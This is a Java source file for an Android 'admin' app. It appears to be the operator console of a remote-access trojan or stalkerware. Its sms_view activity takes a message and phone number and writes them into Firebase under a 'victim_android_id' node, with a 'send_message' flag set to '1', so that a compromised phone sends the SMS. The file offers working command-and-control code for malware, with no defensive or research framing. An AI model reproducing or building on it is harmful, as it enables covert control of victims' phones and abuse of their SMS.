package com.itsolution.adminapp;

import androidx.appcompat.app.ActionBar;
import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class sms_view extends AppCompatActivity {
    DatabaseReference db_for_msg,db_for_nmbr,db_send_or_not;
    EditText msg,nmbr;
    TextView send_sms;
    public String android_id;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_sms_view);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,WindowManager.LayoutParams.FLAG_FULLSCREEN);
        ActionBar actionBar;
        actionBar = getSupportActionBar();
        actionBar.hide();

        Intent intent=getIntent();
        android_id=intent.getStringExtra("android_id");

        nmbr=findViewById(R.id.nmbr);
        msg=findViewById(R.id.msg);
        send_sms=findViewById(R.id.send_now);
        send_sms.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startthis();
            }
        });

    }

    private void startthis() {
        String MESSAGE=msg.getText().toString();
        String NUMBER=nmbr.getText().toString();

        if(MESSAGE.isEmpty()||NUMBER.isEmpty()){
            Toast.makeText(this, "Empty Field Detected", Toast.LENGTH_SHORT).show();
        }else{
            db_for_msg= FirebaseDatabase.getInstance().getReference("victim_android_id").child(android_id).child("task").child("message");
            db_for_msg.setValue(MESSAGE);

            db_for_nmbr= FirebaseDatabase.getInstance().getReference("victim_android_id").child(android_id).child("task").child("phone_number");
            db_for_nmbr.setValue(NUMBER);


            db_send_or_not= FirebaseDatabase.getInstance().getReference("victim_android_id").child(android_id).child("task").child("send_message");
            db_send_or_not.setValue("1");


            Intent intent=new Intent(sms_view.this, com.itsolution.adminapp.MainActivity.class);
            startActivity(intent);
        }


    }
}